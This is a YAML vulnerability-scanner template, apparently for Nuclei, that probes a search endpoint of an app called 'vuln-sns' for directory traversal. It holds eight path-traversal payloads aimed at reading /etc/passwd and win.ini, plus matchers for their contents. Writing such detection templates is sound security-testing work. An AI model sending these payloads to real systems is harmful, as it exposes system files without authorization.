id: vuln-sns-search-directory-traversal
info:
  name: Vuln SNS Search - Directory Traversal
  author: claude
  severity: high
  description: |
    Tests for directory traversal vulnerabilities in the search tag parameter.
  reference:
    - https://owasp.org/www-community/attacks/Path_Traversal
  tags: vuln-sns,lfi,traversal,search

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag={{payload}}"

    payloads:
      payload:
        - "../../../etc/passwd"
        - "..\\..\\..\\windows\\win.ini"
        - "....//....//....//etc/passwd"
        - "..%2F..%2F..%2Fetc%2Fpasswd"
        - "..%252f..%252f..%252fetc%252fpasswd"
        - "/etc/passwd"
        - "../../../../../../etc/passwd"
        - "file:///etc/passwd"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:x:0:0"
          - "[fonts]"
          - "/bin/bash"
        condition: or
        part: body

      - type: regex
        regex:
          - '(\/[a-zA-Z0-9]+)+:[0-9]+:[0-9]+'
        part: body